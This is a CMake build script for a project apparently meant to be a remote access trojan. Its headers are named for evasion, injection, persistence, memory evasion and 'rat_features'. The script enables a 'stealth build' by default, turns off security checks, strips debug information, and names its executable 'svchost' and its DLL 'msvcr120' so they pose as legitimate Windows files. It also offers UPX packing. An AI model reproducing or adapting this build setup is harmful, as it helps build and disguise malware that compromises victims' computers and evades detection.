cmake_minimum_required(VERSION 3.16)

project(WindowsSystemService VERSION 1.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Enable stealth build option
option(ENABLE_STEALTH_BUILD "Enable maximum stealth optimizations" ON)

# Advanced stealth-oriented compiler flags
if(MSVC)
    # Base optimization flags
    set(CMAKE_CXX_FLAGS_RELEASE "/O2 /Ob2 /DNDEBUG /MT /GL /Gy /GS-")
    set(CMAKE_C_FLAGS_RELEASE "/O2 /Ob2 /DNDEBUG /MT /GL /Gy /GS-")
    
    if(ENABLE_STEALTH_BUILD)
        # Advanced stealth flags
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /Qspectre- /guard:cf- /Gw /GA")
        set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} /Qspectre- /guard:cf- /Gw /GA")
        
        # Function-level linking and COMDAT folding
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /Gy /Gw")
        
        # Remove runtime checks
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /GS- /Gs32768")
        
        # Optimize for size and speed
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /Os /Ot")
    endif()
    
    # Advanced linker flags for stealth
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/LTCG /OPT:REF /OPT:ICF /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
    set(CMAKE_SHARED_LINKER_FLAGS_RELEASE "/LTCG /OPT:REF /OPT:ICF")
    
    if(ENABLE_STEALTH_BUILD)
        # Remove all debug information and symbols
        set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /DEBUG:NONE /PDBALTPATH:%_PDB%")
        set(CMAKE_SHARED_LINKER_FLAGS_RELEASE "${CMAKE_SHARED_LINKER_FLAGS_RELEASE} /DEBUG:NONE /PDBALTPATH:%_PDB%")
        
        # Advanced optimization
        set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /MERGE:.rdata=.text")
set(CMAKE_SHARED_LINKER_FLAGS_RELEASE "${CMAKE_SHARED_LINKER_FLAGS_RELEASE} /MERGE:.rdata=.text")
        
        # Remove unused sections - simplified for compatibility
        # set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /ALIGN:16 /FILEALIGN:16")
        
        # Randomize base address
        set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} /DYNAMICBASE /NXCOMPAT")
        set(CMAKE_SHARED_LINKER_FLAGS_RELEASE "${CMAKE_SHARED_LINKER_FLAGS_RELEASE} /DYNAMICBASE /NXCOMPAT")
    endif()
else()
    # GCC/Clang flags for stealth and optimization
    set(CMAKE_CXX_FLAGS_RELEASE "-O2 -DNDEBUG -ffunction-sections -fdata-sections")
    set(CMAKE_C_FLAGS_RELEASE "-O2 -DNDEBUG -ffunction-sections -fdata-sections")
    
    if(ENABLE_STEALTH_BUILD)
        # Advanced stealth flags for GCC/Clang
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} -fvisibility=hidden -fvisibility-inlines-hidden")
        set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} -fvisibility=hidden")
        
        # Additional optimization flags
        set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} -flto -fomit-frame-pointer")
        set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} -flto -fomit-frame-pointer")
        
        # Platform-specific optimizations
        if(CMAKE_SYSTEM_NAME STREQUAL "Linux")
            set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} -fstack-protector-strong")
            set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} -fstack-protector-strong")
        endif()
    endif()
    
    # Linker flags
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "-Wl,--gc-sections -s")
    
    if(ENABLE_STEALTH_BUILD)
        set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} -flto")
        
        # Platform-specific linker flags
        if(CMAKE_SYSTEM_NAME STREQUAL "Linux")
            set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} -Wl,-z,relro,-z,now")
        elseif(CMAKE_SYSTEM_NAME STREQUAL "Darwin")
            set(CMAKE_EXE_LINKER_FLAGS_RELEASE "${CMAKE_EXE_LINKER_FLAGS_RELEASE} -Wl,-dead_strip")
        endif()
    endif()
endif()

# Preprocessor definitions for stealth
if(ENABLE_STEALTH_BUILD)
    add_definitions(
        -DSTEALTH_BUILD=1
        -DNDEBUG
    )
    
    # Platform-specific definitions
    if(WIN32)
        add_definitions(
            -D_CRT_SECURE_NO_WARNINGS
            -D_WINSOCK_DEPRECATED_NO_WARNINGS
            -DWIN32_LEAN_AND_MEAN
            -DNOMINMAX
            -D_WIN32_WINNT=0x0601
        )
    elseif(UNIX AND NOT APPLE)
        add_definitions(
            -D_GNU_SOURCE
            -D_DEFAULT_SOURCE
        )
    elseif(APPLE)
        add_definitions(
            -D_DARWIN_C_SOURCE
        )
    endif()
endif()

# Source files
set(SOURCES
    main.cpp
)

# Header files
set(HEADERS
    evasion.h
    injection.h
    network.h
    persistence.h
    rat_features.h
    memory_evasion.h
)

# Resource files
set(RESOURCES
    version.rc.in
    manifest.xml
)

# Configure version resource
configure_file(version.rc.in version.rc @ONLY)

# Define all project sources
set(PROJECT_SOURCES
    ${SOURCES}
    ${HEADERS}
    ${CMAKE_CURRENT_BINARY_DIR}/version.rc
)

# Create executable (and DLL on Windows)
add_executable(WindowsSystemService ${PROJECT_SOURCES})

# Platform-specific target configuration
if(WIN32)
    # Create DLL version on Windows
    add_library(WindowsSystemService_DLL SHARED ${PROJECT_SOURCES})
    
    # Set Windows subsystem for GUI application
    set_target_properties(WindowsSystemService PROPERTIES
        WIN32_EXECUTABLE TRUE
        LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup /MANIFEST:NO"
    )
else()
    # Unix/Linux/macOS specific properties
    set_target_properties(WindowsSystemService PROPERTIES
        OUTPUT_NAME "stealth_client"
    )
endif()

# Link required libraries (platform-specific)
if(WIN32)
    # Windows-specific libraries
    target_link_libraries(WindowsSystemService PRIVATE
        wininet
        psapi
        advapi32
        kernel32
        user32
        crypt32
        ws2_32
        ntdll
    )
    
    target_link_libraries(WindowsSystemService_DLL PRIVATE
        wininet
        psapi
        advapi32
        kernel32
        user32
        crypt32
        ws2_32
        ntdll
    )
else()
    # Unix/Linux/macOS libraries
    target_link_libraries(WindowsSystemService PRIVATE
        pthread
        dl
    )
    
    # Platform-specific libraries
    if(CMAKE_SYSTEM_NAME STREQUAL "Linux")
        target_link_libraries(WindowsSystemService PRIVATE
            rt
        )
    elseif(CMAKE_SYSTEM_NAME STREQUAL "Darwin")
        find_library(COREFOUNDATION_LIBRARY CoreFoundation)
        find_library(SECURITY_LIBRARY Security)
        target_link_libraries(WindowsSystemService PRIVATE
            ${COREFOUNDATION_LIBRARY}
            ${SECURITY_LIBRARY}
        )
    endif()
endif()

# Compiler definitions for stealth
target_compile_definitions(WindowsSystemService PRIVATE
    STEALTH_MODE=1
)

if(WIN32)
    target_compile_definitions(WindowsSystemService PRIVATE
        WIN32_LEAN_AND_MEAN
        NOMINMAX
        _CRT_SECURE_NO_WARNINGS
    )
    
    target_compile_definitions(WindowsSystemService_DLL PRIVATE
        WIN32_LEAN_AND_MEAN
        NOMINMAX
        _CRT_SECURE_NO_WARNINGS
        STEALTH_MODE=1
        BUILD_DLL=1
    )
else()
    # Unix/Linux/macOS specific definitions
    target_compile_definitions(WindowsSystemService PRIVATE
        UNIX_BUILD=1
    )
endif()

# Set output names to appear legitimate
if(WIN32)
    set_target_properties(WindowsSystemService PROPERTIES
        OUTPUT_NAME "svchost"
        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
    )
    
    set_target_properties(WindowsSystemService_DLL PROPERTIES
        OUTPUT_NAME "msvcr120"
        LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib"
    )
else()
    # Unix/Linux/macOS output configuration
    set_target_properties(WindowsSystemService PROPERTIES
        OUTPUT_NAME "stealth_client"
        RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin"
    )
endif()

# Strip symbols in release mode for additional stealth - disabled for compatibility
# if(CMAKE_BUILD_TYPE STREQUAL "Release")
#     add_custom_command(TARGET WindowsSystemService POST_BUILD
#         COMMAND ${CMAKE_STRIP} $<TARGET_FILE:WindowsSystemService>
#         COMMENT "Stripping symbols for stealth")
#     
#     add_custom_command(TARGET WindowsSystemService_DLL POST_BUILD
#         COMMAND ${CMAKE_STRIP} $<TARGET_FILE:WindowsSystemService_DLL>
#         COMMENT "Stripping DLL symbols for stealth")
# endif()

# Optional: Add UPX packing (uncomment if UPX is available)
# find_program(UPX_EXECUTABLE upx)
# if(UPX_EXECUTABLE)
#     add_custom_command(TARGET WindowsSystemService POST_BUILD
#         COMMAND ${UPX_EXECUTABLE} --best $<TARGET_FILE:WindowsSystemService>
#         COMMENT "Packing executable with UPX")
# endif()